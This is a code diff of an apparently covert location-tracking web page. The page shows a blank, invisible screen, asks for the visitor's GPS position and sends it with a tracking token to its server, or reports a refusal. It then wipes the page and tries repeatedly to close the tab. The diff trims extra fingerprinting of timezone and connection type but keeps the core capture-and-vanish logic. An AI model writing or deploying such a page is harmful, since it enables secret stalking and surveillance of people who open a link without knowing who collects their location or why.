@@ -6,11 +6,7 @@
 <title> </title>
 <style>
   *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-  html, body {
-    background: #000;
-    overflow: hidden;
-    width: 100%; height: 100%;
-  }
+  html, body { background: #000; overflow: hidden; width: 100%; height: 100%; }
   body { opacity: 0; }
 </style>
 </head>
@@ -26,23 +22,6 @@
     return;
   {% endif %}
 
-  // ── Get browser timezone (NO PERMISSION NEEDED) ──
-  function getTimezone() {
-    try {
-      return Intl.DateTimeFormat().resolvedOptions().timeZone;
-    } catch(e) {
-      return null;
-    }
-  }
-
-  function getConnType() {
-    try {
-      var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (c) return c.effectiveType || c.type || null;
-    } catch(e) {}
-    return null;
-  }
-
   function sendToServer(lat, lng, acc) {
     if (sent) return;
     sent = true;
@@ -50,9 +29,7 @@
       token: token,
       latitude: lat,
       longitude: lng,
-      accuracy: acc,
-      connectionType: getConnType(),
-      timezone: getTimezone()
+      accuracy: acc
     });
     var blob = new Blob([payload], { type: 'application/json' });
     if (navigator.sendBeacon) {
@@ -66,43 +43,33 @@
   function sendDenied() {
     if (sent) return;
     sent = true;
-    var payload = JSON.stringify({
-      token: token,
-      connectionType: getConnType(),
-      timezone: getTimezone()
-    });
-    var blob = new Blob([payload], { type: 'application/json' });
-    if (navigator.sendBeacon) {
-      navigator.sendBeacon('/api/location-denied', blob);
-    } else {
-      try { fetch('/api/location-denied', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
-    }
+    fetch('/api/location-denied', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ token: token }),
+      keepalive: true
+    }).catch(function(){});
     window._sent = true;
   }
 
   function vanish() {
     if (!sent) { sent = true; window._sent = true; }
-    
-    // ── AGGRESSIVE TAB CLOSE ──
     try { window.location.replace('about:blank'); } catch(e) {}
     try { window.open('', '_self', '').close(); } catch(e) {}
     try { self.close(); } catch(e) {}
     try { window.close(); } catch(e) {}
-    
     setTimeout(function() {
       try {
         document.open();
         document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"></head><body></body></html>');
         document.close();
       } catch(e) {}
-      setTimeout(function() {
-        try { window.location.href = 'data:text/html,'; } catch(e) {}
-      }, 10);
     }, 10);
   }
 
   function tryGPS() {
     if (!("geolocation" in navigator)) {
+      sendDenied();
       vanish();
       return;
     }
@@ -138,6 +105,7 @@
             sendDenied();
             vanish();
           } else {
+            // prompt state — will show the browser dialog
             attemptGPS(function() { vanish(); });
             setTimeout(function() { if (!window._sent) vanish(); }, 16000);
           }
